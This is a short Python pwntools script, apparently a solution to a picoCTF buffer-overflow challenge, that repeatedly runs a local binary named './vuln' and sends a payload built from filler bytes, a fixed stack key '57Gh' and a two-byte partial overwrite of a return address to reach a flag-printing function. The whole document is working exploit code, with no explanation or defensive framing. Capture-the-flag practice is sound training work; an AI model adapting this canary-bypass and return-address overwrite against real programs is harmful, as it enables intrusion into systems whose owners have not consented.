from pwn import *
import sys
import string

BUF_SIZE = 32
FLAG_LEN = 64
KEY_LEN  = 4
OV_OFFSET = 16

key = "57Gh"
display_flag = "\xed\x07" # struct.pack("<I", 0x7ed)

while True:
    r = process("./vuln")
    r.sendlineafter("Please enter the length of the entry:\n>", str(BUF_SIZE + KEY_LEN + (OV_OFFSET + 2)))

    payload = "A" * BUF_SIZE + key + "A" * OV_OFFSET + display_flag
    r.sendlineafter("Input> ", payload)

    response = r.recvall(timeout=0.4)
    if b"pico" in response or b"CTF" in response or "pico" in response:
        log.info("Payload : " + payload)
        log.info("Flag : " + response)
        exit(0)

    r.close()